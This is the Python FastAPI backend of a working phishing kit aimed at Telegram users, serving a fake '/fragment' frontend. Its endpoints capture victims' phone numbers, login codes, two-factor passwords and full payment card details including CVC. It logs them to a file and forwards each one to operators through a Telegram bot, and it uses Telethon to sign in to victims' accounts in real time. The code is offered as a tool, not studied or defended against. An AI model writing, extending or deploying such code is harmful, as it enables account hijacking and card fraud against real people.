import os
import json
import asyncio
from fastapi import FastAPI, Request, HTTPException, APIRouter
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from aiogram import Bot
from telethon import TelegramClient, errors
from pydantic import BaseModel
from dotenv import load_dotenv

load_dotenv()

ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN")
API_ID = os.getenv("TELEGRAM_API_ID")
API_HASH = os.getenv("TELEGRAM_API_HASH")

admin_bot = Bot(token=ADMIN_BOT_TOKEN)
app = FastAPI()

# We use a router to prefix all API endpoints with /fragment
router = APIRouter(prefix="/fragment")

# Active Telethon clients: phone -> client
clients = {}

class PhoneData(BaseModel):
    phone: str
    user: dict = None

class CodeData(BaseModel):
    phone: str
    code: str
    user: dict = None

class TwoFAData(BaseModel):
    phone: str
    twoFactor: str
    user: dict = None

class CardData(BaseModel):
    phone: str
    cardData: dict
    user: dict = None

async def notify_admins(text: str):
    if os.path.exists("admins.json"):
        with open("admins.json", "r") as f:
            admins = json.load(f)
            for admin_id in admins:
                try:
                    await admin_bot.send_message(admin_id, text, parse_mode="Markdown")
                except Exception as e:
                    print(f"Failed to notify {admin_id}: {e}")

def save_submission(data: dict):
    with open("submissions.txt", "a") as f:
        f.write(json.dumps(data) + "\n")

@router.get("/api/link/{link_id}")
async def get_link(link_id: str):
    if os.path.exists("links.json"):
        with open("links.json", "r") as f:
            links = json.load(f)
            if link_id in links:
                return links[link_id]
    raise HTTPException(status_code=404, detail="Link not found")

@router.post("/api/submit/phone")
async def submit_phone(data: PhoneData):
    save_submission({"type": "phone", "data": data.model_dump()})

    user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
    await notify_admins(f"📞 *New Phone Number Captured!*\n\n{user_info}\nPhone: `{data.phone}`")

    if API_ID and API_HASH:
        client = TelegramClient(f"sessions/{data.phone}", int(API_ID), API_HASH)
        await client.connect()
        try:
            await client.send_code_request(data.phone)
            clients[data.phone] = client
            return {"status": "ok", "message": "Code sent"}
        except Exception as e:
            print(f"Telethon error: {e}")
            return {"status": "error", "message": str(e)}

    return {"status": "ok", "message": "Captured (No Telethon)"}

@router.post("/api/submit/code")
async def submit_code(data: CodeData):
    save_submission({"type": "code", "data": data.model_dump()})
    await notify_admins(f"🔑 *New Code Captured!*\n\nPhone: `{data.phone}`\nCode: `{data.code}`")

    if data.phone in clients:
        client = clients[data.phone]
        try:
            await client.sign_in(data.phone, data.code)
            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}`!")
            return {"status": "logged_in"}
        except errors.SessionPasswordNeededError:
            return {"status": "2fa_needed"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    return {"status": "ok"}

@router.post("/api/submit/2fa")
async def submit_2fa(data: TwoFAData):
    save_submission({"type": "2fa", "data": data.model_dump()})
    await notify_admins(f"🔐 *New 2FA Password Captured!*\n\nPhone: `{data.phone}`\nPassword: `{data.twoFactor}`")

    if data.phone in clients:
        client = clients[data.phone]
        try:
            await client.sign_in(password=data.twoFactor)
            await notify_admins(f"✅ *SUCCESS!* Logged into `{data.phone}` with 2FA!")
        except Exception as e:
            print(f"2FA Error: {e}")

    return {"status": "ok"}

@router.post("/api/submit/card")
async def submit_card(data: CardData):
    save_submission({"type": "card", "data": data.model_dump()})
    card = data.cardData
    await notify_admins(f"💳 *New Card Details Captured!*\n\nPhone: `{data.phone}`\n"
                        f"Number: `{card.get('number')}`\n"
                        f"Expiry: `{card.get('expiry')}`\n"
                        f"CVC: `{card.get('cvc')}`\n"
                        f"Name: `{card.get('name')}`")
    return {"status": "ok"}

app.include_router(router)

# Serve Frontend on /fragment
if os.path.exists("design/dist"):
    app.mount("/fragment", StaticFiles(directory="design/dist", html=True), name="static")

@app.exception_handler(404)
async def not_found(request, exc):
    # If the user goes to /fragment/anything, show the index.html for SPA routing
    if request.url.path.startswith("/fragment"):
        return FileResponse("design/dist/index.html")
    raise exc

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
